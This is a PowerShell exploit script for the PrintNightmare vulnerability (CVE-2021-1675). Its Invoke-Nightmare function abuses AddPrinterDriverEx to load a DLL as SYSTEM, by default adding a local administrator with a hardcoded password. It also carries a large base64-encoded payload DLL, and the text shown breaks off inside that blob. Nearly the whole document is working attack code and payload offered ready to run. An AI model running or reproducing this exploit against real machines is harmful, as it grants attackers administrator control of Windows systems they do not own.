function Invoke-Nightmare
{
    <#
        .SYNOPSIS
        Exploits CVE-2021-1675 (PrintNightmare)

        Authors:
            Caleb Stewart - https://github.com/calebstewart
            John Hammond - https://github.com/JohnHammond
        URL: https://github.com/calebstewart/CVE-2021-1675

        .DESCRIPTION
        Exploits CVE-2021-1675 (PrintNightmare) locally to add a new local administrator
        user with a known password. Optionally, this can be used to execute your own
        custom DLL to execute any other code as NT AUTHORITY\SYSTEM.

        .PARAMETER DriverName
        The name of the new printer driver to add (default: "Totally Not Malicious")

        .PARAMETER NewUser
        The name of the new user to create when using the default DLL (default: "adm1n")

        .PARAMETER NewPassword
        The password for the new user when using the default DLL (default: "P@ssw0rd")

        .PARAMETER DLL
        The DLL to execute when loading the printer driver (default: a builtin payload which
        creates the specified user, and adds the new user to the local administrators group).

        .EXAMPLE
        > Invoke-Nightmare
        Adds a new local user named `adm1n` which is a member of the local admins group

        .EXAMPLE
        > Invoke-Nightmare -NewUser "caleb" -NewPassword "password" -DriverName "driver"
        Adds a new local user named `caleb` using a printer driver named `driver`

        .EXAMPLE
        > Invoke-Nightmare -DLL C:\path\to\

    #>
    param (
        [string]$DriverName = "Totally Not Malicious",
        [string]$NewUser = "",
        [string]$NewPassword = "",
        [string]$DLL = ""
    )

    if ( $DLL -eq "" ){
        $nightmare_data = [byte[]](get_nightmare_dll)
        $encoder = New-Object System.Text.UnicodeEncoding

        if ( $NewUser -ne "" ) {
            $NewUserBytes = $encoder.GetBytes($NewUser)
            [System.Buffer]::BlockCopy($NewUserBytes, 0, $nightmare_data, 0x32e20, $NewUserBytes.Length)
            $nightmare_data[0x32e20+$NewUserBytes.Length] = 0
            $nightmare_data[0x32e20+$NewUserBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new user: adm1n"
        }

        if ( $NewPassword -ne "" ) {
            $NewPasswordBytes = $encoder.GetBytes($NewPassword)
            [System.Buffer]::BlockCopy($NewPasswordBytes, 0, $nightmare_data, 0x32c20, $NewPasswordBytes.Length)
            $nightmare_data[0x32c20+$NewPasswordBytes.Length] = 0
            $nightmare_data[0x32c20+$NewPasswordBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new password: P@ssw0rd"
        }

        $DLL = [System.IO.Path]::GetTempPath() + "nightmare.dll"
        [System.IO.File]::WriteAllBytes($DLL, $nightmare_data)
        Write-Host "[+] created payload at $DLL"
        $delete_me = $false
    } else {
        Write-Host "[+] using user-supplied payload at $DLL"
        Write-Host "[!] ignoring NewUser and NewPassword arguments"
        $delete_me = $false
    }

    $Mod = New-InMemoryModule -ModuleName "A$(Get-Random)"

    $FunctionDefinitions = @(
      (func winspool.drv AddPrinterDriverEx ([bool]) @([string], [Uint32], [IntPtr], [Uint32]) -Charset Auto -SetLastError),
      (func winspool.drv EnumPrinterDrivers([bool]) @( [string], [string], [Uint32], [IntPtr], [UInt32], [Uint32].MakeByRefType(), [Uint32].MakeByRefType()) -Charset Auto -SetLastError)
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Mod'

    # Define custom structures for types created
    $DRIVER_INFO_2 = struct $Mod DRIVER_INFO_2 @{
        cVersion = field 0 Uint64;
        pName = field 1 string -MarshalAs @("LPTStr");
        pEnvironment = field 2 string -MarshalAs @("LPTStr");
        pDriverPath = field 3 string -MarshalAs @("LPTStr");
        pDataFile = field 4 string -MarshalAs @("LPTStr");
        pConfigFile = field 5 string -MarshalAs @("LPTStr");
    }

    $winspool = $Types['winspool.drv']
    $APD_COPY_ALL_FILES = 0x00000004

    [Uint32]($cbNeeded) = 0
    [Uint32]($cReturned) = 0

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, [IntPtr]::Zero, 0, [ref]$cbNeeded, [ref]$cReturned) ){
        Write-Host "[!] EnumPrinterDrivers should fail!"
        return
    }

    [IntPtr]$pAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([Uint32]($cbNeeded))

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned) ){
        $driver = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pAddr, [System.Type]$DRIVER_INFO_2)
    } else {
        Write-Host "[!] failed to get current driver list"
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
        return
    }

    Write-Host "[+] using pDriverPath = `"$($driver.pDriverPath)`""
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)

    $driver_info = New-Object $DRIVER_INFO_2
    $driver_info.cVersion = 3
    $driver_info.pConfigFile = $DLL
    $driver_info.pDataFile = $DLL
    $driver_info.pDriverPath = $driver.pDriverPath
    $driver_info.pEnvironment = "Windows x64"
    $driver_info.pName = $DriverName

    $pDriverInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($driver_info))
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($driver_info, $pDriverInfo, $false)

    if ( $winspool::AddPrinterDriverEx($null, 2, $pDriverInfo, $APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000) ) {
        if ( $delete_me ) {
            Write-Host "[+] added user $NewUser as local administrator"
        } else {
            Write-Host "[+] driver appears to have been loaded!"
        }
    } else {
        Write-Error "[!] AddPrinterDriverEx failed"
    }

    if ( $delete_me ) {
        Write-Host "[+] deleting payload from $DLL"
        Remove-Item -Force $DLL
    }
}

function get_nightmare_dll
{
    $nightmare_data = [System.Convert]::FromBase64String("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
